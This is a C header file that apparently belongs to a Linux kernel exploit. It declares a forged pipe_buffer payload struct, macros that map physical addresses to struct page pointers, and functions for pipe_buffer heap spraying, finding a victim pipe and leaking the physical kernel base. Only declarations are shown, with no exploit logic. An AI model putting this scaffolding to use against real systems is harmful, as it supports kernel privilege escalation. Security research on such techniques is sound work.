#ifndef _PIPE_BUFFER_H_
#define _PIPE_BUFFER_H_

#include "offsets.h"

/*
 * pipe size = (n * PAGE_SIZE) where n is a power of 2 that
 * specifies how many struct pipe_buffers to create
 */
#define PIPE_SZ 4096 

struct pipe {
    int read;
    int write;
};

#define PREFIX_BUFFER_LEN   16

struct pipe_buffer_payload {
    uint8_t prefix[PREFIX_BUFFER_LEN];
    void *page;
    unsigned int offset;
    unsigned int len;
} __attribute__((packed));

#define PHYSICAL_START  0x1000000
#define PHYSICAL_ALIGN  0x200000

#define STRUCT_PAGE_SIZE    0x40  /* size of struct page */
#define INCREMENT_SIZE      (PHYSICAL_ALIGN * 8)
#define paddr_to_page(vmemmap_base, paddr) \
    ((vmemmap_base) + (((paddr) >> 12) * STRUCT_PAGE_SIZE))

#define INIT_STRING    "XXXXXXXX"
#define INIT_STRING_SZ sizeof(INIT_STRING)

void spray_pipe_buffer(uint32_t spray_size, struct pipe *fd_buffer);
void release_pipe_buffer(uint32_t spray_size, struct pipe *fd_buffer);
long get_phys_base(uint32_t spray_size, struct pipe *fd_buffer, long paddr);
struct pipe *get_victim_pipe(uint32_t spray_size, struct pipe *fd_buffer);

#endif /* _PIPE_BUFFER_H_ */
